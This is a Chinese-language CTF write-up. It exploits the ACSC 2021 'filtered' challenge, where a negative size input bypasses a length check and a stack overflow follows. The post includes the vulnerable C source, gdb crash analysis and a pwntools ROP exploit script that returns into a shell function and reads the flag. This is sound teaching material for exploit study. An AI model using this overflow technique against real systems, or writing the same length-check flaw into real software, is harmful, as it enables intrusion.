

|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|

# Linux 栈溢出夺旗赛入门速成技巧 - 第二天 -- 利用开发例子

现采用 ACSC 2021 夺旗赛其中一个题目 filtered 作示范例子。这条题目提供了源码作分析用途。

香港其中一队夺旗赛战队黑荆在优兔 (Youtube) 提供了这一题目的广东话教学和源码下载。这个多小时的教学讲觧了如何觧题和进行利用开发。

现在我用一个比较新鲜的方法去进行这道题的觧题和进行开发，比较后你会发现与黑荆战队的有很大的差别。我的方法是尽用 pwntools 的功能来简化利用开发的程序。而且这个执行档还可以在任何版本的 libc 库运行，这就是所谓可靠的利用 (Reliable Exploit) 了。

利用开发环境是 Ubuntu Desktop 20.04.4 LTS。

## 编译

如果你没有下载其二进制执行档的话，你可以用以下的源码进行编译。

```
gcc -fno-stack-protector -no-pie -fPIE filtered.c -o filtered
```

## filtered.c 源码

```
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Call this function! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
  exit(0);
}

/* Print `msg` */
void print(const char *msg) {
  write(1, msg, strlen(msg));
}

/* Print `msg` and read `size` bytes into `buf` */
void readline(const char *msg, char *buf, size_t size) {
  char c;
  print(msg);
  for (size_t i = 0; i < size; i++) {
    if (read(0, &c, 1) <= 0) {
      print("I/O Error\n");
      exit(1);
    } else if (c == '\n') {
      buf[i] = '\0';
      break;
    } else {
      buf[i] = c;
    }
  }
}

/* Print `msg` and read an integer value */
int readint(const char *msg) {
  char buf[0x10];
  readline(msg, buf, 0x10);
  return atoi(buf);
}

/* Entry point! */
int main() {
  int length;
  char buf[0x100];

  /* Read and check length */
  length = readint("Size: ");
  if (length > 0x100) {
    print("Buffer overflow detected!\n");
    exit(1);
  }

  /* Read data */
  readline("Data: ", buf, length);
  print("Bye!\n");

  return 0;
}

```

## 二进制执行档的安全机制

用以下指令查看其安全机制 ：

```
pwn checksec filtered
```

```
[*] '/home/samiux/filtered/filtered'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 查看这个执行档的资讯

用以下指令查看 ：

```
file filtered
```

```
filtered: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2aab92ca29870d84f3e331906b5a5aef2c50a22c, for GNU/Linux 3.2.0, not stripped
```

```
ldd filtered
```

```
linux-vdso.so.1 (0x00007ffcc6d93000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa8aafd8000)
/lib64/ld-linux-x86-64.so.2 (0x00007fa8ab1e6000)

```

因为有源码的关係，很容易在源码中看到一句 ```Buffer overflow detected```。在源码中看到两个变量 (Variable) 0x100 和 0x10，它们的十进制分别是 256 和 16。两个相加就是 272 个缓冲值。我们用调试器 (Debugger) 去证实一下。

## 用调试器调试

```
gdb ./filtered
```

```
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./filtered...
(No debugging symbols found in ./filtered)
pwndbg>

```

我们尝试用 300 个缓冲试试可否令程序崩溃。

```
pwndbg> cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

```

因为源码显示 ```Size``` 变量只接受数字 (int)，经过一番尝试，而负数加 300 个缓冲可以另程序崩溃。所以证实这个程序有栈溢出漏洞。所以在 ```Size: ``` 里输入 -1，然后在 ```Data:``` 输入 300 个缓冲就会令程序崩溃了。

```
pwndbg> r
Starting program: /home/samiux/filtered/filtered
Size: -1
Data:
```

```
RAX  0x0
RBX  0x5555555553a0 (__libc_csu_init) ◂— endbr64
RCX  0x7ffff7ece0a7 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
RDX  0x5
RDI  0x1
RSI  0x555555556040 ◂— 0xa21657942 /* 'Bye!\n' */
R8   0x1999999999999999
R9   0x0
R10  0x7ffff7f5bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
R11  0x246
R12  0x555555555100 (_start) ◂— endbr64
R13  0x7fffffffe060 ◂— 0x1
R14  0x0
R15  0x0
RBP  0x6361617463616173 ('saactaac')
RSP  0x7fffffffdf78 ◂— 'uaacvaacwaacxaacyaac'
RIP  0x555555555399 (main+107) ◂— ret   
─────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────
► 0x555555555399 <main+107>    ret    <0x6361617663616175>










─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdf78 ◂— 'uaacvaacwaacxaacyaac'
01:0008│     0x7fffffffdf80 ◂— 'waacxaacyaac'
02:0010│     0x7fffffffdf88 ◂— 0x7f0063616179 /* 'yaac' */
03:0018│     0x7fffffffdf90 ◂— 0x1f7fa87a0
04:0020│     0x7fffffffdf98 —▸ 0x55555555532e (main) ◂— endbr64
05:0028│     0x7fffffffdfa0 —▸ 0x5555555553a0 (__libc_csu_init) ◂— endbr64
06:0030│     0x7fffffffdfa8 ◂— 0x6c77e221e9ef78fe
07:0038│     0x7fffffffdfb0 —▸ 0x555555555100 (_start) ◂— endbr64
───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
► f 0   0x555555555399 main+107
   f 1 0x6361617663616175
   f 2 0x6361617863616177
   f 3   0x7f0063616179
   f 4      0x1f7fa87a0
   f 5   0x55555555532e main
   f 6   0x5555555553a0 __libc_csu_init
   f 7 0x6c77e221e9ef78fe
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```
pwndbg> cyclic --offset uaac
280
```

在 ``` Data：``` 里输入 280 个缓冲不能令其崩溃，经测试证明 281 可以令程序崩溃而 280 不可。故正确缓冲应该是 280。

另外在分析源码时，你会发现 ```execve``` 和 ```/bin/sh``` 在函数 ```win()``` 内，但这个函数是永远不会被触碰的，换句话来说只要执行 ```win()``` 函数就可以获得 Shell。

如何去执行这个函数呢？我们可以利用 pwntools 的返回导向编程 (rop) 功能来实现。

## exploit.py 漏洞利用脚本

```
#!/usr/bin/env python3

'''
ACSC 2021 filtered

gcc -fno-stack-protector -no-pie -fPIE filtered.c -o filtered

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

'''

from pwn import *

# debug purpose
#context.log_level = "debug"

context.binary = elf = ELF('./filtered', checksec=True)

if args.REMOTE:
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        p = remote('filtered.chal.acsc.asia', 9001)
elif args.GDB:
        #context.terminal = ['tmux','splitw','-h']
        context.terminal = ['gnome-terminal','--window','-e']
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        p = process('./filtered')
        gdb.attach(p, gdbscript='tbreak *main')
else:
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        p = process('./filtered')

PATTERN_OFFSET = 280

rop = ROP(elf)
#rop.call(rop.ret[0])
rop.win()

log.info(rop.dump())

p.recvuntil(b'Size: ')
p.sendline(b'-1')
p.recvuntil(b'Data: ')

payload = flat({ PATTERN_OFFSET: rop.chain() })

p.sendline(payload)
p.recvline(b'Bye!')

p.sendline(b'cat flag.txt')
log.success(f'Flag: {p.recvline().decode("utf-8")}')
#p.interactive()

```


## 执行結果

```
python3 exploit.py
```

```
[*] '/home/samiux/filtered/filtered'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './filtered': pid 2471
[*] Loaded 14 cached gadgets for './filtered'
[*] 0x0000:         0x4011d6 win()
[+] Flag: ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}
[*] Stopped process './filtered' (pid 2471)

```

结果获得 Shell 及展示 flag.txt ：

```
ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}

```

Samiux   
OSCE  OSCP  OSWP   
二零二二年五月一日，中国香港   

### 参考资料 ：

- [PWN 101 - Buffer Overflow 「广东话 CTF 新手教学」-- Black Bauhinia 黑荆战队](https://www.youtube.com/watch?v=Ag0OcqbVggc)   
- [ACSC 2021 filtered 下载](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbEhPWE9sUFU1OEZBZFFJaWNVbG5qZkhWdnpkUXxBQ3Jtc0trQ0NqTnRoSmU0ZTQ3eUJFM1AwcDl4V3BHRWxEOUo5bjhBbG5rMTFhWF8xc2JlWnY3WDh2TXR6UmxVYW1KQkptdFk0MWhTeTMyMlRNWjQ0MERQbWdMeHpFUmRmZWZsUGdnVS1wenlJaDg3T19QTDFuWQ&q=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1YwFlz9fUE4KD_Jkv3psqtyknmf_otrsX&v=Ag0OcqbVggc)  

|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|
